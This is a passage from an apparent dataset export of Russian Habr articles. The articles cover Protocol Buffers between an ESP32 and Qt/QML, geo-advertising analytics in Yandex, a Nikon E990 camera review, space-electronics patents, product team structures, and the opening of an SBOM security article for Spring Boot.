protobufManager.getValveState()             ledButton.buttonState = protobufManager.getLedState()             break;          case ProtobufManager.HEART_BEAT:              // Делаем что-то             break;          case ProtobufManager.MESSAGE_OK:              // Делаем что-то             break;          case ProtobufManager.MESSAGE_ERROR:              // Делаем что-то             break;          case ProtobufManager.MESSAGE_TIMEOUT:              // Делаем что-то             break;          default:             console.log(""Invalid Message Type."")             break;         }     } }Мы можем воспользоваться механизмом сигналов и слотов на стороне C++, чтобы понять, было ли получено сообщение.// protobuf_manager.h ... signals:      void messageReceived(); ...Protobuf‑сообщение можно отправлять в различных условиях, которые нам необходимы.PumpIndicator{     id: waterPumpOfTank     width: 300     height: 300     anchors.top: eConductivity.top     anchors.left: eConductivity.right     anchors.leftMargin: 50      pumpState: true     pumpText: ""Tank Water Pump""      onPumpClicked: {         if(pumpState)             protobufManager.sendCommand(ProtobufManager.CMD_PUMP_ON)         else             protobufManager.sendCommand(ProtobufManager.CMD_PUMP_OFF)     }  }Я разработал временный пользовательский интерфейс для мониторинга данных, получаемых от ESP32. Он выглядит довольно просто, но я все еще работаю над ним🙂Примечание: Все изображения и иконки, используемые в этом пользовательском интерфейсе, были взяты с сайтов freepik.com и flaticon.com.Пользовательский интерфейс для гидропонной системыHydroponic UIЗаключениеКак мы увидели, Protocol Buffers предлагает более компактный формат для обмена данными по сравнению с JSON и XML. Его преимущество заключается в более высокой скорости передачи данных благодаря уменьшенному размеру. Protocol Buffers могут быть использован с различными протоколами связи, такими как UART, SPI и I2C, между двумя встроенными системными устройствами, где требуется создание пользовательских пакетов, а не только для связи между серверами или клиентами. Это позволяет сэкономить время на разработке структуры пакета, его создании, синтаксическом анализе и других аспектах, связанных с обменом данными между двумя устройствами. Но, конечно, всегда стоит учитывать время, необходимое для интеграции Protocol Buffers во встроенные системы.В рамках этой статьи невозможно продемонстрировать весь код, поэтому я постарался разобрать как можно больше примеров, связанных с Protocol Buffers. Если вы хотите увидеть полный код для ESP32 и Qt/QML, вы можете посетить мою страницу на Github.В завершение нашего погружения в мир Protocol Buffers и эффективной передачи данных между ESP32 и Qt/QML, я рад пригласить вас на открытый урок по теме «Путешествие в мир Авроры. Искусство создания приложений с Qt/QML», где мы получим практический опыт создания простого приложения на QML, взаимодействующего с графической подсистемой. Урок пройдет 22 апреля, записывайтесь по ссыке.Открытые уроки в Otus проходят каждый день — переходите в календарь мероприятий и выбирайте интересующие темы.  "
71,Как методы расширенной аналитики помогают оценить эффективность георекламы в Яндексе,Click.ru,Рекламная экосистема,0,"Реклама и маркетинг, Поисковые технологии, Веб-сервисы",2025-04-09,"Геореклама помогает привлекать клиентов, которые находятся рядом с вами. С ее помощью можно рассказать пользователям об акциях, скидках или просто напомнить о бренде. Этот формат рекламы пока используют нечасто, хотя он эффективен и доступен любому бизнесу. Рассказываем, как его применять и правильно измерять результаты, а также чем могут помочь инструменты аналитики click.ru.Главные показатели для оценки эффективности георекламыДля оценки эффективности георекламы в сервисах Яндекса используют разные инструменты аналитики — как базовые, так и расширенные. Разберем их подробно.В БизнесеЭффективность георекламы можно оценить в личном кабинете раздела «Статистика».Статистика в БизнесеЗдесь отображаются просмотры, количество кликов (переходов) и действия целевых клиентов в карточке. При подключении услуги коллтрекинга также доступна детальная аналитика звонков: принятые и пропущенные вызовы, время ожидания и продолжительность разговора.В ДиректеВ Директе наиболее прозрачная и подробная статистика по рекламе в геосервисах. Если подключены кампании в Картах, можно просто анализировать стандартный Мастер отчетов.Статистика в ДиректеВ нем можно выбрать срезы «Название площадки» и «Вид размещения» и задать фильтр по типу размещения «Карты». Другие столбцы и срезы — на ваше усмотрение. Кроме базовых метрик (показов, кликов) доступна более глубокая аналитика: процент отказов, конверсии, география, устройства, а также демографические характеристики аудитории.В ГеорекламеОтчет доступен в личном кабинете во вкладке «Статистика». Статистика в ГеорекламеЗдесь можно увидеть следующие показатели:число показов объявления (учитываются просмотры длительностью не менее 2 секунд);количество кликов по баннеру;CTR — соотношение кликов к показам;количество перестроенных маршрутов в сторону рекламируемой точки;число звонков и переходов на сайт;затраты на рекламную кампанию.Методы расширенной аналитикиГлавные задачи медийной рекламы — охватить аудиторию и познакомить ее с продуктом. Для оценки эффективности кампаний важно понимать, как реклама помогла достичь именно эти цели. Рассмотрим инструменты, которые предоставляют возможность выявить этот «отложенный» эффект. Есть пять исследований, позволяющих получить детальную аналитику. Их подключение можно заказать через персонального менеджера.Brand LiftЕсли вы раньше запускали стандартную медийную рекламу в Директе, то уже познакомились с этим исследованием. Оно позволяет оценить, как изменилось восприятие бренда после контакта с рекламой. Исследование проводится по завершении размещения в Навигаторе или Картах и доступно для кампаний, ориентированных на Москву и Санкт-Петербург.Brand Lift для пользователейBrand Lift — это опрос. Пользователи отвечают на вопросы, касающиеся, кроме прочего, и вашего бренда. На основе полученных данных можно определить, сколько людей выбрали ваш бренд после того, как увидели геомедийную рекламу и насколько увеличилась его узнаваемость.Часть результатов опроса Brand LiftSearch LiftЭто исследование, знакомое по медийной рекламе в Директе, позволяет оценить, как просмотр рекламы влияет на частоту брендовых запросов в Картах и Навигаторе. Также помогает определить, какие именно запросы вводили пользователи. Подходит для следующих форматов:пины в Геосервисах;билборды и премиум-билборды в Геосервисах;баннеры и премиум-баннеры в Геосервисах.Рекомендованный бюджет — от 300 000 рублей в месяц.Часть результатов отчета по исследованию Search LiftAction LiftПозволяет оценить, изменилось ли поведение пользователей в геосервисах после контакта с георекламой — начали ли они чаще открывать карточку организации, прокладывать маршруты и доезжать до точки.Обязательные условия для проведения исследования:подключенная Метрика для медийной рекламы;наличие офлайн-точек у компании.Важно: исследование фиксирует намерения пользователей посетить филиал, а не фактические конверсии.Часть результатов исследования Action LiftOffline Visit LiftЭто исследование доступно для рекламы в формате «Пины в Геосервисах». Оно позволяет понять, как часто пользователи нажимали кнопку «Заехать» на баннере и выросло ли количество визитов в офлайн-точки после просмотра рекламы.Особенности:для анализа выбираются отдельно стоящие точки продаж, чтобы исключить влияние соседних заведений;исследование подходит для автоцентров, ресторанов быстрого обслуживания и других локаций с четкой геопривязкой.Необходимые условия:наличие офлайн-точек;бюджет кампании от 500 000 руб. в месяц.Схема исследования Offline Visit LiftO2O (online-to-offline)Продажи — ключевая метрика эффективности, но отследить влияние онлайн-рекламы на офлайн-покупки непросто. Исследование O2O помогает решить эту задачу с помощью алгоритмов на основе технологии Крипта, которые сопоставляют данные о показах рекламы и фактических покупках.Как это работает:алгоритм анализирует поведенческий профиль пользователей (интересы, запросы, демографию) в обезличенном формате;определяет, кто видел рекламу в геосервисах;сравнивает эти данные со списком покупателей, переданным рекламодателем, чтобы выявить пользователей, которые сделали покупку после контакта с рекламой.Схема исследования O2OОтчет формируется на основе данных о покупках, которые рекламодатель передает персональному менеджеру. Файл загружается в Аудитории по аналогии с CRM-сегментами.Post-campaignТакой отчет можно запросить у персонального менеджера. В нем собирается вся аналитика в одном документе, включая статистику кампании из кабинета геомедийной рекламы, сгруппированную по нужным параметрам. Отчет оформляется в виде презентации с наглядными графиками, демонстрирующими влияние рекламы на продажи. В нем учитываются post-view-данные из поиска, показатели из Метрики и данные о доходимости аудитории.Советы по улучшению георекламы с помощью аналитикиЯндекс предлагает множество инструментов для оценки эффективности георекламы. Главное — правильно интерпретировать данные и вносить нужные корректировки.В БизнесеСтатистика здесь ограничена, но позволяет оценить конверсионность продвижения и качество входящих звонков. Если заявок мало, стоит проверить:информативность карточки организации — добавлены ли все филиалы, качественные ли фото и описание;идет ли работа с отзывами;как оперативно сотрудники отвечают на звонки. Если много непринятых, возможно, стоит улучшить клиентский сервис.В ДиректеОсновной инструмент анализа — Мастер отчетов. Здесь больше возможностей для оптимизации:корректировки ставок помогут отсеять нерелевантную аудиторию;эксперименты со стратегиями и бюджетом позволят найти оптимальную модель размещения.Однако в Картах геонастройки из рекламной кампании не работают, а заголовки и тексты не отображаются. Поэтому ключевой фактор успеха — качественное оформление карточки организации.В геомедийной рекламеПри оптимизации используем расширенную аналитику.Search Lift — анализ популярных запросов, которые можно добавить в контекстную рекламу.Brand Lift — сравнение узнаваемости бренда с конкурентами. Если отстаете, стоит изучить их рекламу и продукт.Action Lift — помогает понять, на каком этапе пользователи «отваливаются». Например, если после клика на карточку они не строят маршрут, возможно, стоит пересмотреть контент или добавить больше кнопок действий.Offline Visit Lift — показывает, почему пользователи не перестраивают маршрут в пользу вашей точки. Если аудитория выбрана неправильно, стоит пересмотреть таргетинг.O2O — помогает оценить «доходимость» пользователей. Если точка расположена в проходимом месте, например в ТЦ, не все визиты будут целевыми.Правильный анализ данных позволит скорректировать кампанию и повысить ее эффективность.ЗаключениеГеореклама помогает повысить узнаваемость бренда, но не стоит ожидать от нее мгновенного эффекта. Она работает на долгосрочную перспективу, формируя образ компании. Результаты проявляются постепенно.Формат требует серьезных вложений, поэтому важно отслеживать его эффективность с помощью расширенной аналитики. Если бюджет ограничен, лучше стартовать с Директа или Бизнеса — они менее затратны и дают более прозрачные показатели. Чтобы анализировать динамику рекламы в разных системах и оценивать ситуацию в нише, можно бесплатно использовать инструмент «Пульс click.ru». Он помогает следить за ключевыми метриками, изучать рынок, сравнивать конкурентов и грамотно распределять бюджет."
72,Nikon E990 — цифровой динозавр 2000 года,RUVDS.com,VDS/VPS-хостинг. Скидка 15% по коду HABR15,0,"Связь и телекоммуникации, Домены и хостинг, Веб-сервисы",2025-04-09,"Эта камера — семейная реликвия, первая цифровая камера моего отца. Мы активно использовали её много лет с момента покупки, и она до сих пор исправно работает, а ведь прошло почти четверть века.   Конструкция фотокамеры состоит из двух частей, соединённых шарниром: рукоятки с экраном, батарейным отсеком, элементами управления и блока с объективом, видоискателем и вспышкой. Линзовый блок можно поворачивать относительно рукоятки для удобной съёмки с любого положения камеры, в том числе направляя на себя. Например, для съёмки селфи.  Шарнир работает мягко, с чёткой фиксацией на углах, кратных прямому. За столько времени ничего не разболталось.  Надо отдать должное инженерам и производителям за качественные материалы. За столько лет не протёрлась краска на углах, пластик не растрескался, ничего не отвалилось. Только резиновая наклейка на рукоятке немного разбухла от кожного жира — это типичная проблема фотокамер Nikon, которая решается вымачиванием в бензине.   Мне нравится минимализм и продуманность конструкции, камеру удобно удерживать в руке и включать поворотом «воротника» вокруг кнопки спуска. Он имеет четыре положения: «Выключено», «Автоматический режим», «Ручной режим» и «Просмотр». Назначение немногочисленных кнопок понятно из пиктограмм и подписей и интуитивно осваивается достаточно быстро.  Под большим пальцем правой руки удобно расположено колёсико смены параметров. Оно всегда работало чётко, правда, сейчас наблюдаются пропуски и инверсия. Полагаю, что это стандартная проблема энкодеров, возникающая из-за окисления контактов.   Одно из самых любимых свойств этой камеры — питание от стандартных пальчиковых батареек или от Ni-Mh аккумуляторов. Это решает проблему с питанием в труднодоступных условиях, ведь можно взять целый запас батареек. Если не пользоваться вспышкой и отключать экран, то камера довольно экономно расходует заряд.   Зум-объектив закрыт защитным стеклом с просветлением. Перемещения линз при трансфокации и фокусировке происходят внутри линзоблока. За всё время там не появилось ни одной пылинки (а за экраном появились). В камере установлен смешной по сравнению с 35-мм кадром CCD-сенсор размером 7,2 x 5,3 мм. Эквивалентное фокусное расстояние — 38-115 мм.   И тут о самом грустном в данной камере: и оптика, и сенсор имеют посредственные характеристики. Объектив не очень резкий, заметно виньетирует края кадра, видны хроматические аберации. На «длинном конце» диапазона фокусных расстояний он не очень резкий.   Матрица имеет узнаваемую цветопередачу, что даёт ценимый некоторыми любителями старины особый винтажный вайб эпохи становления цифровой фотоиндустрии.   Ещё у этой матрицы небольшой динамический диапазон и сильный шум, в котором ночные снимки утопают. Также на ней с самого начала было несколько «горячих пикселей» — дефектов производства. Недавно снял кадр с закрытым объективом с теми же параметрами, что на снимке. Дефектов стало значительно больше. Видимо, матрица деградирует со временем.    Оригинальный кадр   На поворотном блоке находится оптический видоискатель с трансфокатором; при изменении фокусного расстояния объектива меняется угол обзора видоискателя.    Заглянуть в видоискатель    В камере используются флеш-карты формата CF. На одном из торцов располагается слот со сдвигающейся крышкой. На противоположном торце располагается декоративный шильдик с металлическими рельефными буквами поверх принта, имитирующего красное дерево.    Экран типичный для того времени: маленький, с низким разрешением и малыми углами обзора.    Интерфейс камеры выглядит архаично, но в этом и есть особый шарм. Меню разделено на три глобальных раздела: первые два связаны с экспозицией, автофокусом, настройками размера и качества изображения. Третий — служебные и общие параметры фотокамеры: дата, язык, время автоматического отключения. Меню в целом имеет черты современных камер.   Полезным свойством камеры является макро-режим, позволяющий снимать мелкие объекты с двух сантиметров. Мне нравится, что инженеры предусматривают макро-режим в камерах любительского уровня, потому что если вы снимаете на камеру со съёмной оптикой, то придётся купить специальный макро-объектив или удлинительные кольца.    Несколько огорчает отсутствие записи в RAW; вместо него есть монструозный TIFF с размером файлов в 9 MiB против стандартных JPEG 1MiB, не дающий заметных преимуществ. Забавно, что предусмотрена запись видеороликов без звука, но они такого ужасного качества, что даже в 2001 году выглядели бесполезно и проигрывали привычным VHS-камерам.   Ещё хочу отметить, что оправа объектива имеет резьбу под фильтр, и фирма Nikon выпускала несколько оптических приставок, расширяющих возможности камеры: пара сверхширокоугольных насадок (одна из них «рыбий глаз»), пара теленасадок и даже адаптер для пересъёмки негативов. Ещё выпускался многофункциональный пульт с возможностью контроля экспозиции, фокусировки и с таймером для интервальной съёмки.   P. S.: Сегодня я бы не стал использовать E990 в художественной съёмке. Какими бы тёплыми ни были воспоминания, с ней связанные, её тормознутость и плохая резкость перечёркивают всё. А малый динамический диапазон, выраженный и некрасивый шум могут необратимо испортить кадр.   Галерея с пояснениями Крутой берег реки Мезень, красная осадочная порода мергель с повышенным содержанием железа.     Зелёные цвета передаются самыми насыщенными, возможно, отгадка в том, что зелёных светочувствительных сенсоров на матрице вдвое больше остальных.  Мои первые попытки астрофотографии. Крупная белая точка — это Венера, все остальные это артефакты CCD матрицы.  Одигитриевская церковь в Кимже, до реставрации.    © 2025 ООО «МТ ФИНАНС»  Telegram-канал со скидками, розыгрышами призов и новостями IT 💻"
73,Электроника для космических аппаратов: патентный анализ,Online patent,Ваш личный патентный офис,0,"Консалтинг и поддержка, Веб-сервисы",2025-04-09,"В последние годы активно наращивается число спутников Земли для многочисленных практических применений, в частности телевидения, мобильной связи, дистанционного зондирования поверхности. Космическая электроника включает в себя приборы и электронные компоненты, специально разработанные для использования в космических аппаратах, таких как спутники, ракеты и зонды для исследования космоса. Эти системы необходимо проектировать и производить таким образом, чтобы надёжно функционировать в суровых условиях космоса, которые включают экстремальные температуры, радиационное воздействие и вакуумную среду. О них мы и поговорим в нашей статье в преддверии Дня космонавтики. И, разумеется, не забудем про патентный аспект.Электроника для орбитыК основным типам космической электроники относятся радиационно-стойкие компоненты. Радиационная стойкость подразумевает проектирование электроники и компонентов, работоспособных при значительных уровнях ионизирующего излучения. Примеры: микропроцессоры, контроллеры, датчики, специализированные интегральные схемы (ASIC), микросхемы памяти, кабели источников питания.В феврале 2025 г. опубликовано маркетинговое исследование Space Electronics Market Report 2025. В нём сообщается, что в последние годы рынок космической электроники значительно вырос. В 2025 году его объём составит 2,81 миллиарда долларов при среднегодовом темпе роста (CAGR) 7,1%. Рост в данный исторический период экспертами, и российскими, и иностранными, объясняется следующим:многочисленными инициативами в области освоения космоса, значительными инвестициями в производство спутников, увеличением спроса на продукцию космической электроники, ростом популярности космических услуг, увеличением количества запусков спутников,активизацией человеческой деятельности в дальнем космосе.Всем ясны перспективы рынка космической электроники, устойчивой к радиации. Понятны важные аспекты, связанные с ростом числа запусков околоземных космических устройств, миниатюризацией и повышением эффективности, быстрым ростом инвестиций в космические проекты, внедрением новых материалов для более качественного изготовления космической электроники. Специалисты отмечают основные тенденции: развитие радиационно-стойких полупроводниковых технологий, цифровизацию и программно-определяемые системы, высокопроизводительные вычисления для космических миссий, фотонику и оптоэлектронику в космической связи, кибербезопасность в космических системах, экологичность электроники для космоса.Крупнейшими компаниями, работающими на рынке космической электроники, являются BAE Systems PLC, Texas Instruments, Inc., Cobham PLC, Honeywell International Inc., STMicroelectronics, Teledyne e2v (UK) Ltd., TT Electronics, Ruag Group, Infineon Technologies, Onsemi, Renesas Electronics Corporation, Analog Devices Inc., Microchip Technology Inc., NXP Semiconductors, Vishay Intertechnology Inc., Silicon Laboratories Inc., L3Harris Technologies Inc., Lockheed Martin Corporation, Northrop Grumman Corporation, Raytheon Technologies Corporation, Thales Group, Airbus Defence and Space.Патентный аспектНа портале Google.Patents поиск по запросу Space electronics показывает более 100 тыс документов. Лидерами по количеству патентов указаны следующие компании:Samsung Electronics Co., Ltd. — 17,1%;LG Electronics Inc. — 3,1%;Dexcom, Inc. — 1,5%;Semiconductor Energy Laboratory — 1,2%;Apple Inc. — 1,2%.Названия компаний говорят сами за себя. В аспекте Международной Патентной Классификации рейтинг кодов следующий:обработка цифровых данных с помощью электрических устройств G06F — 36,7%телефонная связь H04M — 15,7%диагностика; хирургия; опознание личности A61B — 13,2%печатные схемы; корпусы или детали электрических приборов H05K — 12,9%распознавание изображений G06V — 10,9%передача изображений H04N — 10,6%обработка или генерация данных изображения G06T — 10,2%передача цифровой информации H04L — 9,1%сети безпроводной связи H04W — 9%передача сигналов H04B — 8,6%системы обработки данных G06Q — 8,2%антенны H01Q — 7.8%оптические элементы, системы или приборы G02B — 7,8%сокращение выбросов парниковых газов Y02E — 6,2%радиопеленгация; радионавигация; измерение расстояния или скорости с использованием радиоволн; определение местоположения или обнаружение объектов с использованием отражения или переизлучения радиоволн; аналогичные системы с использованием других видов волн G01S — 5,9%системы для подачи или распределения электроэнергии H02J — 5,4%компьютерные системы, основанные на специфических вычислительных моделях G06N — 4,9%схемы или устройства управления индикаторными приборами с использованием статических средств для представления переменных величин G09G — 4,8%громкоговорители, микрофоны, адаптеры или аналогичные электромеханические преобразователи звука H04R — 4,1%То есть, в мировом патентном пространстве тема «Космос и электроника» звучит многопланово, полифонично. Переиначивая тройственные данности философа-экзистенциалиста Жан-Поль Сартра можно сказать, что есть «космос-в-электронике» (воздействие космических сил на устройства электроники), «электроника-для-космоса» (электронные устройства для деятельности в космосе) и «электроника-в-космосе» (аспекты функционирования электроники в космических пространствах). Международная патентная классификация разложила нашу симфонию на 10 «нот»:обработка цифровых данных про космос, из космоса и для космоса;распознание изображений а) при взгляде с Земли в космос, б) из космоса на Землю, в) с космических аппаратов на другие космические объекты, например конкурирующие или враждебные спутники;дистанционная диагностики здоровья космонавтов и космонавток;генерация данных изображения, например ложных, маскирующих;передача информации, в том числе защищённой и т.д.беспроводная связь (мобильники) через и в космосе;электронные системы для подачи или распределения электроэнергии в космосе; оптика в космосе;космическая радиопеленгация и радионавигация;звуки в космосе.Возьмём для примера H05K. Здесь около 66 тыс патентов на апрель 2025 г., лидеры следующие:Samsung Electronics Co., Ltd.— 9,9%Ibiden Co., Ltd. — 3,6%Hitachi Chemical Company — 1,5%Panasonic Corporation — 1,4%International Business Machines Corporation — 1,4%Нас в данной статье интересуют полупроводниковые приборы космических аппаратов. Проводим зауженный поиск на портале Google.Patents поиск по запросу Space electronics H01L. В ответ получаем 26564 документа (на апрель 2025). Динамика по годам представлена на рис. 1Рисунок 1: Динамика мирового патентования изобретений на тему «Space electronics L01H»Источник: интерпретация автора данных Google.Patents 04.04.2025Видно, что активность патентования в 1986-2019 гг. шла по нарастающей, но затем в 2020-2024 гг. снизилась вдвое. Возможно, это обусловлено давлением режимности/секретности разработок в данной области науки и техники, как государственной, так и коммерческой.Лидерами Google.Patents обозначил следующие компании:Samsung Electronics Co., Ltd. — 6,6%;Taiwan Semiconductor Manufacturing Company, Ltd. — 2,8%;Tokyo Electron Limited — 1,1%;Intel Corporation— 1,1%;International Business Machines Corporation— 0,9%.Опять всем известные корпорации во главе с Samsung. А что в России? В базе ФИПС в рефератах на изобретения РФ по запросам электроника космических аппаратов, космос электроника, H01L космос и др. сходных по человеческому смыслу найдено порядка 100 патентов. Некоторые документы – не релевантные (поисковая машина ФИПС выдает по указанному запросу и наземную электронику для целей функционирования космических аппаратов и прочий информационный шум, разумеется, шум именно для нашей темы). Мы вручную отобрали следующие патенты на изобретения РФ по электронике, в том числе радиоэлектронике, космических устройств. Вот примеры:№2411607 (2011) Способ изготовления шунтирующего диода для солнечных батарей космических аппаратов. АО «Информационные спутниковые системы имени академика М. Ф. Решетнёва». №2455727 (2012) Полевой транзисторный ключ. АО «Информационные спутниковые системы имени академика М. Ф. Решетнёва». №2469063 (2012) Способ изготовления герметичного электронного модуля и клеевая композиция для осуществления способа. АО «Научно-производственный центр «Алмаз-Фазотрон» (Саратов). Изобретение относится к бортовой радиоэлектронной аппаратуре (РЭА).№2601251 (2016) КМОП КНИ интегральная микросхема с повышенной радиационной стойкостью (варианты). ООО «СИТРОНИКС-Микродизайн» (Зеленоград); после 2021 г. переименовано в ООО «НИИМЭ Микродизайн». Изобретение относится к субмикронным интегральным микросхемам со структурой кремний-на-изоляторе (КНИ), образованным комплементарными N-канальными и P-канальными транзисторами со структурой металл-окисел-полупроводник (КМОП). №2605839 (2016) Фотоэлектрический преобразователь. ГК «Роскосмос». В базе ФИПС числится несколько действующих патентов на полезные модели, например:№219254 (2023) Солнечная батарея космического назначения с регенерацией эксплуатационных характеристик. АО «Научно-производственное предприятие «Квант» (входит в состав интегрированной структуры «Российских космических систем»). Полезная модель относится к области полупроводниковых приборов и может быть использована при создании солнечных батарей космических аппаратов с большим энергопотреблением.№221604 (2023) Датчик измерения акустической эмиссии. АО «ЭКА». Технический результат достигается датчиком измерения акустической эмиссии, возникающей в твердом теле при воздействии импульсного ударного нагружения, содержащим корпус, в котором жёстко закреплён пьезокерамический чувствительный элемент, плоскости которого металлизированы.ЗаключениеНаша страна входит в узкую группу лидеров в производстве и эксплуатации многочисленных космических устройств, в том числе и в большинстве своём с электронными компонентами. Наше исследование доказало, что открытые патенты РФ по космической электронике сравнительно немногочисленны, но патентообладатели – очень серьёзные структуры. Очевидно, многие изобретения о веществах электроники, её схем, функциональных устройств, способов изготовления, приёмах эксплуатации и обслуживания - засекречены или используются в режиме ноу-хау. То есть мы показали «верхушку айсберга», доступную для открытого наблюдения. Эксперты Онлайн Патента предполагают, что помимо уже указанных российских патентообладателей компетенциями в компонентах космической электроники обладают и другие предприятия вроде Института общей физики им. А.М. Прохорова РАН, Санкт-Петербургского государственного университета аэрокосмического приборостроения и т.п. Бросается в глаза отсутствие иностранных патентообладателей. Никто даже заявки на  патенты не подавал. Бесплатный поиск, мониторинг и регистрация товарных знаков  и других объектов интеллектуальной собственности.Поиск по программам для ЭВМРегистрация программы для ЭВМ "
74,"Как формируют продуктовые команды Apple, Amazon, Google и другие лидеры рынка",Garage Eight,Garage Eight — продуктовая IT-компания,0,"Веб-разработка, Программное обеспечение, Мобильные технологии",2025-04-09,"Привет, Хабр! Я Александр Бондаренко — CPO Garage Eight. В прошлых статьях моего цикла про продуктовую культуру (часть 1; часть 2) я разобрал 12 типов продуктовых команд. А в этом материале хочу разобрать другую классификацию структур организации и поделиться способами, которые помогут вписать продуктовую группу в контур компании. 1. Matrix organization — МатрицаВ такой структуре команды пересекают функциональные и продуктовые направления. Например, инженеры работают над несколькими продуктами одновременно. Это имеет место в компаниях с ограниченными ресурсами и широкой линейкой продуктов. Часто встречается в консалтинговых фирмах или компаниях с проектной структурой, таких как Accenture.Когда стоит выбрать эту модель?Если у вас команды работают над разными продуктами, но пересекаются по функциям.Важно оптимизировать распределение ресурсов.Вы хотите повысить кросс-функциональность без потери экспертизы.Пример: В одной крупной консалтинговой компании и международной IT-компании команды формируются под проекты, что типично для консалтинговых фирм (например, Accenture) и продуктовых компаний с матричной структурой, как SAP. SAP — пример компании с широкой линейкой продуктов, где платформенные команды и эксперты могут работать над несколькими продуктами одновременно.2. Platform teams — Команды платформенного уровняКомпании создают специализированные команды, отвечающие за платформенные решения. Команды поддерживают сразу несколько продуктовых направлений, например, API или инфраструктурные сервисы. Это удобно для организаций с множеством продуктов, где важны стандартизация и переиспользование технологий. Примеры компаний — Amazon (AWS как внутренняя платформа) и Google.Когда стоит выбрать эту модель?Если у вас большая экосистема, в которой критична инфраструктура.Важно создать единую технологическую платформу.Компания делает ставку на API, SDK, инструменты для внутренних команд.Пример: Amazon AWS и Google Cloud предоставляют облачные решения для внутренних и внешних клиентов. AWS предлагает масштабируемые вычислительные мощности и хранение данных, а Google Cloud поддерживает облачные сервисы для хранения данных, машинного обучения и других услуг.3. Product-led growth teams — Команды продуктового ростаВ такой структуре продукт становится основным драйвером роста. Так происходит, например, при использовании freemium-модели. Подход эффективен для B2B и SaaS-компаний, которые привлекают пользователей благодаря удобству и ценности самого продукта. Яркие примеры — Slack и Zoom.Когда стоит выбрать эту модель?Если у вас B2B SaaS-продукт или приложение с self-service моделью.Важно масштабировать продукт за счет удобства, а не маркетинга.Вы хотите снизить затраты на продажи и привлечь пользователей через продукт.Пример: Компании Slack, Zoom, Notion, Dropbox. Так, Zoom предлагает бесплатные видеоконференции для пользователей и малых команд, с возможностью перехода на платные тарифы по мере роста потребностей.4. Venture studio model — Венчурные студииОрганизация запускает несколько продуктовых команд, каждая из которых работает как небольшой самостоятельный стартап. Подход помогает тестировать новые идеи и расширять продуктовый портфель компании. Среди примеров можно выделить Rocket Internet и венчурные подразделения крупных корпораций.Когда стоит выбрать эту модель?Если у вас компания, которая планирует создание нескольких стартапов внутри себя.Важно генерировать новые бизнес-модели и быстро тестировать идеи.Вы хотите запускать продукты в духе стартапов, но с поддержкой крупного бизнеса.Пример: Rocket Internet запускают несколько стартапов одновременно, предоставляют финансовую поддержку и ресурсы для быстрого роста.5. Innovation pods — Команды инновацийКомпании создают небольшие автономные группы, сосредоточенные исключительно на разработке новых идей и концептов. Это подходит для крупных организаций, где важен высокий уровень инноваций. Например, в Apple такие команды работают над секретными проектами.Когда стоит выбрать эту модель?Если у вас корпорация, которой нужно тестировать новые идеи без риска для основного бизнеса.Важно проверять гипотезы и быстро запускать MVP.Вы хотите экспериментировать с новыми технологиями, рынками или бизнес-моделями.Пример: Apple славится своими закрытыми командами, которые обладают высокой автономией и конфиденциальностью, что позволяет им сосредотачиваться на разработке инновационных продуктов и технологий, не отвлекаясь на текущие операционные задачи.6. Community-led product teams — Команды, основанные на сообществеПодход предполагает активное вовлечение комьюнити в процесс разработки продукта, например, через open-source или программы обратной связи. Он эффективен для компаний с сильным и вовлеченным сообществом пользователей. К ним можно отнести Red Hat и GitLab.Когда стоит выбрать эту модель?Если у вас open-source продукт или сильное сообщество пользователей.Важно учитывать мнение пользователей при разработке.Компания ориентирована на вовлечение разработчиков.Пример: Red Hat предоставляет решения на основе открытого кода и поддерживает активное взаимодействие с разработчиками и пользователями. 7. Guilds and centers of excellence — Гильдии и центры компетенцийКомпании формируют специализированные группы экспертов, которые поддерживают стандарты и лучшие практики внутри организации. Модель используется в масштабных структурах с разрозненными командами. Примеры: гильдии в Spotify и центры компетенций в IBM.Когда стоит выбрать эту модель?Если у вас много продуктовых команд, которым нужна экспертиза и лучшие практики.Важно обеспечить единые стандарты работы, но не мешать гибкости команд.Нужна передача знаний между разными командами и поддержка роста специалистов.Пример: IBM создала центры компетенций для демонстрации и тестирования своих продуктов и решений.8. Customer journey teams — Команды по этапам пути клиентаГруппы организуются вокруг этапов взаимодействия клиента с продуктом, таких как онбординг, удержание пользователей и монетизация. Это работает в компаниях, которые делают упор на клиентский опыт. Классические примеры — Netflix и Airbnb.Когда стоит выбрать эту модель?Если у вас сильный фокус на клиентский опыт.Важно улучшить каждый этап взаимодействия пользователя с продуктом.Компания работает в e-commerce, банках или сервисах с высокой конкуренцией.Пример: Netflix использует картирование пути клиента для глубокого понимания поведения и предпочтений своих пользователей. Итак, вы изучили несколько способов, как построить команду и отобрали, допустим, 5 подходящих для вашего бизнеса. Что делать дальше? Как понять, какая из них лучше? Об этом я подробно расскажу в следующей статье цикла, которая уже скоро выйдет у меня в блоге. А пока подписывайтесь и рассказывайте в комментариях, какие способы организации продуктовой команды приглянулись вам больше всего (а какие вызвали вопросы). Давайте обсудим! "
75,SBOM в Spring Boot: от генерации до анализа уязвимостей,Spring АйО,Компания,0,Программное обеспечение,2025-04-09,"Команда Spring АйО перевела статью, которая расскажет вам, как правильно использовать SBOM файлы в Spring Boot для проверок безопасности приложений. Статья содержит примеры кода и выводимых при проверке данных, а также помогает правильно трактовать эти данные. Эта статья покажет вам, как использовать поддержку SBOM в Spring Boot для реализации проверок безопасности для ваших приложений. Software Bill of Materials (SBOM) содержит список всех компонентов кодовой базы вашего приложения, которые либо пришли от третьих сторон, либо являются open-source. Таким образом, он дает вам возможность производить сканирование уязвимостей, проверку лицензий и анализ рисков. Spring Boot 3.3 вводит встроенную поддержку генерации SBOM во время сборки приложения и предоставления доступа к ним через эндпоинт актуатора. В этой статье мы проанализируем приложение, написанное на последней версии Spring Boot, а также еще одно приложение, использующее устаревшие версии библиотек. Вы увидите, как использовать snyk CLI для проверки сгенерированных SBOM файлов.Исходный кодЕсли вы хотите попробовать выполнить это упражнение самостоятельно, вы всегда можете воспользоваться исходным кодом. На настоящий момент вам для этого придется клонировать два Git репозитория с примерами. Первый содержит автоматически обновляемый исходный код микросервисов, использующий последнюю версию фреймворка Spring Boot. Второй репозиторий содержит заархивированную версию микросервисов, которая использует более раннюю версию Spring Boot, которая сейчас уже не поддерживается. Как только вы клонируете обе репозитория, вам надо будет следовать приведенным инструкциям. Кстати говоря, вы можете проверить файлы SBOM, сгенерированные для ваших Spring Boot приложений, разными способами. Я решил использовать Snyk CLI. В качестве альтернативы вы можете использовать веб версию программы проверки Snyk SBOM, доступную здесь. Чтобы установить Snyk CLI на машину, можно воспользоваться документацией. Я воспользовался homebrew, чтобы инсталлировать программу на macOS:$ brew tap snyk/tap $ brew install snykВключение поддержки SBOM в Spring BootПо умолчанию Spring Boot 